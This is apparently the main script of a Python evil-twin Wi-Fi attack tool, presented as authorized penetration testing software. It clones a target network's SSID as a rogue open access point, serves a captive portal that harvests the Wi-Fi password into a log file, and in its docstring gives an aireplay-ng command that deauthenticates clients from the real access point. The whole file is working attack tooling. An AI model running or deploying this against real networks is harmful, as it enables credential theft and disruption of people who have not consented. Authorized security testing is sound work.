#!/usr/bin/env python3
"""
Evil Wi-Fi — Authorized Penetration Testing Tool

Creates a rogue open AP that clones a target SSID, assigns clients IPs via
DHCP, sinks all DNS to the gateway, and serves a captive portal that
captures the Wi-Fi password.

If you want to deauth clients from the real AP manually:
  sudo aireplay-ng --deauth 0 -a <BSSID> <monitor-interface>

Usage:
  sudo python3 main.py -i wlan0
  sudo python3 main.py -i wlan0 --ssid "TargetSSID" --channel 6
  sudo python3 main.py -i wlan0 --ssid "TargetSSID" --bssid AA:BB:CC:DD:EE:FF --channel 6
"""

import argparse
import os
import signal
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from controllers.ap_controller import APController
from controllers.portal_controller import PortalController
from models.credentials import CredentialStore
from models.network import NetworkScanner
from views.cli.display import Display


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description='Evil Wi-Fi — Authorized Penetration Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument('-i', '--interface', required=True,
                   help='Wireless interface for the rogue AP (e.g. wlan0)')
    p.add_argument('--ssid', default=None,
                   help='Target SSID — skips the interactive scan')
    p.add_argument('--bssid', default=None,
                   help='Target BSSID (informational — logged with captures)')
    p.add_argument('--channel', type=int, default=6,
                   help='Wi-Fi channel (default: 6)')
    return p.parse_args()


def main() -> None:
    display = Display()
    display.banner()

    if os.geteuid() != 0:
        display.error("Root privileges required.  Run with: sudo python3 main.py ...")
        sys.exit(1)

    args = parse_args()

    # ── Resolve target ────────────────────────────────────────────────────
    if args.ssid:
        ssid, channel, bssid = args.ssid, args.channel, args.bssid
        display.info(f"Target: {ssid}  channel={channel}"
                     + (f"  BSSID={bssid}" if bssid else ""))
    else:
        display.info(f"Scanning for networks on {args.interface} ...")
        try:
            networks = NetworkScanner(args.interface).scan()
        except RuntimeError as e:
            display.error(str(e))
            sys.exit(1)

        if not networks:
            display.error("No networks found. Is the interface up and in managed mode?")
            sys.exit(1)

        selected = display.select_network(networks)
        ssid, channel, bssid = selected.ssid, selected.channel, selected.bssid
        display.success(f"Selected: {ssid}  [{bssid}]  channel {channel}")

    # ── Build components ──────────────────────────────────────────────────
    store = CredentialStore()
    ap = APController(interface=args.interface)
    portal = PortalController(store=store)
    portal.set_ssid(ssid)

    ap_started = False

    def shutdown(sig=None, frame=None) -> None:
        print()
        display.info("Shutting down and restoring interfaces ...")
        portal.stop()
        if ap_started:
            display.info(f"Stopping AP on {args.interface} — NetworkManager will reconnect ...")
            ap.stop()
        n = len(store.all())
        display.success(
            f"Clean exit. {n} credential{'s' if n != 1 else ''} saved to logs/credentials.log"
        )
        display.info("Run  python3 gui_viewer.py  to review captures.")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    # ── Launch ────────────────────────────────────────────────────────────
    try:
        display.info("Starting captive portal ...")
        portal.start()
        time.sleep(0.5)

        if channel > 14:
            display.warning(
                f"Target is on 5 GHz (channel {channel}). "
                "If the adapter cannot create a 5 GHz AP, the tool will "
                "automatically fall back to channel 6 (2.4 GHz)."
            )

        # active_channel may downgrade to 6 if the adapter is 5 GHz-restricted
        active_channel = channel

        display.info(f"Starting rogue AP  SSID='{ssid}'  channel={active_channel} ...")
        ap.start(ssid=ssid, channel=active_channel)
        ap_started = True

        display.success(f"Evil twin active — '{ssid}'  |  Portal: http://192.168.87.1")
        display.info("Waiting for credentials ...  Ctrl+C to stop and restore your Wi-Fi.\n")

        store.on_new(display.credential_captured)

        _ap_failures = 0
        while True:
            time.sleep(3)
            if ap._hostapd_proc and ap._hostapd_proc.poll() is not None:
                _ap_failures += 1
                err = ap.last_hostapd_error()

                if 'NO-IR' in err and active_channel > 14:
                    # Adapter's EEPROM blocks 5 GHz AP mode. Automatically
                    # downgrade to 2.4 GHz and restart without counting it
                    # as a hard failure — most routers broadcast both bands
                    # with the same SSID so clients will still find us.
                    display.warning(
                        f"5 GHz (channel {active_channel}) blocked by adapter EEPROM — "
                        "automatically switching to channel 6 (2.4 GHz) ..."
                    )
                    active_channel = 6
                    _ap_failures = 0
                    ap.start(ssid=ssid, channel=active_channel)
                    display.success(
                        f"Evil twin restarted on channel 6 (2.4 GHz) — "
                        "clients with this SSID saved will connect automatically."
                    )
                    continue

                if err:
                    display.error(f"hostapd output:\n{err}")

                if _ap_failures >= 3:
                    if 'NO-IR' in err:
                        display.error(
                            "Adapter is fully restricted — even 2.4 GHz AP mode is blocked.\n"
                            "Use a different adapter (Alfa AWUS036NHA / RTL8812AU recommended)."
                        )
                    else:
                        display.error(
                            "hostapd failed 3 times in a row.\n"
                            "  Check AP mode support:  iw list | grep -A10 'Supported interface modes'\n"
                            "  Check for conflicts:    nmcli device show " + args.interface
                        )
                    shutdown()
                display.warning(f"hostapd exited (attempt {_ap_failures}/3) — restarting ...")
                ap.start(ssid=ssid, channel=active_channel)
            else:
                _ap_failures = 0

    except KeyboardInterrupt:
        shutdown()
    except Exception as exc:
        display.error(f"Fatal: {exc}")
        shutdown()


if __name__ == '__main__':
    main()
